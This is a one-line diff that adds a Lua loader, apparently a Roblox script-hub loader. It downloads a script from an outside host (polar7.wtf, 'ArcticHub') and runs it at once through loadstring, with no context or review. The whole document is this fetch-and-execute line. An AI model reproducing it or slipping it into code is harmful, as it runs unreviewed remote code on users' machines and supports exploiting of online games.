@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://polar7.wtf/Arctic/ArcticHub/PingUi.txt"))()
